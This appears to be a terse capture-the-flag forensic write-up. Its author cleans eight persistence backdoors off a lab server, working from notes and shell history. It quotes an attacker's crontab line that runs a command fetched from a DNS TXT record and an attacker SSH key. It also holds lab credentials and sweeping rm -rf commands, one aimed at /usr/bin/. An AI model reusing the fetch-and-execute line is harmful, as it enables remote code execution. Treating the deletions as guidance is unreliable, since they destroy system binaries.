# PersistenceIsFutile (Forensic challenge)

Hackers made it onto one of our production servers 😅. We've isolated it from the internet until we can clean the machine up. The IR team reported eight difference backdoors on the server, but didn't say what they were and we can't get in touch with them. We need to get this server back into prod ASAP - we're losing money every second it's down. Please find the eight backdoors (both remote access and privilege escalation) and remove them. Once you're done, run /root/solveme as root to check. You have SSH access and sudo rights to the box with the connections details attached below.
username: user<br>password: hackthebox

[https://0xv1n.github.io/posts/persistenceisfutile/](https://0xv1n.github.io/posts/persistenceisfutile/)

*[image unavailable]*
*[image unavailable]*

*[image unavailable]*

*[image unavailable]*
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

ps auxf
*[image unavailable]*

/var/lib/private/connectivity-check
*[image unavailable]*

part 7 now partially fixed
*[image unavailable]*
*[image unavailable]*

not sure whats going on
*[image unavailable]*

ok
*[image unavailable]*

<span color="red">removed</span>
<span color="red">user@forensicspersistence-17295-6647595f69-zjcqs:\~\$ sudo rm -rf /var/lib/private/connectivity-check<br>user@forensicspersistence-17295-6647595f69-zjcqs:\~\$ sudo rm -rf /etc/update-motd.d/30-connectivity-check</span>

removed and killed process
*[image unavailable]*

*[image unavailable]*
user@forensicspersistence-17295-6647595f69-t4qcw:\~\$ crontab -l
- /bin/sh -c "sh -c \$(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
*[image unavailable]*
no sudo cron
removed crontab -e job

*[image unavailable]*
*[image unavailable]*

removed access-up
<span color="red">sudo rm -rf /etc/cron.daily/access-up</span>

*[image unavailable]*

*[image unavailable]*
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 nobody@nothing
*[image unavailable]*

echo key to keys to rsa in
<span color="red">`bad /home/user/.bashrc`</span>
*[image unavailable]*
*[image unavailable]*
*[image unavailable]*

<span color="red">sudo rm -rf /lib/python3/dist-packages/ssh_import_id_updateF</span>
*[image unavailable]*
*[image unavailable]*
<span color="red">find / -user root -perm -4000 -print</span>
Find any binaries that are owned by root and also have SetUID permissions

*[image unavailable]*
*[image unavailable]*

more clean up
sudo rm -rf /usr/bin/alertd

user@forensicspersistence-17295-6647595f69-zjcqs:\~\$ sudo rm -rf /etc/cron.daily/pyssh
user@forensicspersistence-17295-6647595f69-zjcqs:\~\$ sudo rm -rf /root/.ssh/authorized_keys
user@forensicspersistence-17295-6647595f69-zjcqs:\~\$ rm -rf /home/user/.backdoor<br>user@forensicspersistence-17295-6647595f69-zjcqs:\~\$ rm -rf /home/user/.sudo_as_admin_successful
user@forensicspersistence-17295-6647595f69-zjcqs:\~\$ find / -user root -perm -4000 -print

8  sudo rm -rf /usr/bin/alertd<br>9  sudo rm -rf /etc/cron.daily/access-up<br>10  sudo rm -rf /etc/cron.daily/pyssh<br>11  sudo rm -rf /lib/python3/dist-packages/ssh_import_id_update<br>12  sudo rm -rf /home/user/.backdoor<br>13  sudo rm -rf /usr/sbin/ppppd<br>14  sudo rm -rf /usr/sbin/afdluk<br>15  find / -user root -perm -4000 -print<br>16  sudo rm -rf /usr/bin/umount<br>17  sudo rm -rf /usr/bin/newgrp<br>18  sudo rm -rf /usr/bin/chsh<br>19  sudo rm -rf /usr/bin/chfn<br>20  sudo rm -rf /usr/bin/mount<br>21  sudo rm -rf /usr/bin/gpasswd<br>22  sudo rm -rf /usr/bin/dlxcrw<br>23  sudo rm -rf /usr/bin/<br>24  find / -user root -perm -4000 -print<br>25  ps auxf \| grep connectivity-check \| awk '\{print \$2\}'<br>26  sudo kill 93<br>27  sudo kill 19<br>28  sudo kill 74<br>29  sudo ps axuf \| grep "alertd" \| awk '\{print \$2\}'<br>30  sudo kill 102<br>31  sudo ps axuf \| grep "alertd" \| awk '\{print \$2\}'<br>32  sudo kill 108<br>33  sudo ps axuf \| grep "alertd"<br>34  sudo kill 114<br>35  sudo killall -9 alertd<br>36  sudo kill -9 alertd<br>37  sudo sed '\$d' /root/.ssh/authorized_keys \> \~/a; sudo cp \~/a /root/.ssh/authorized_keys<br>38  sudo /root/solveme<br>39  euit<br>40  exit
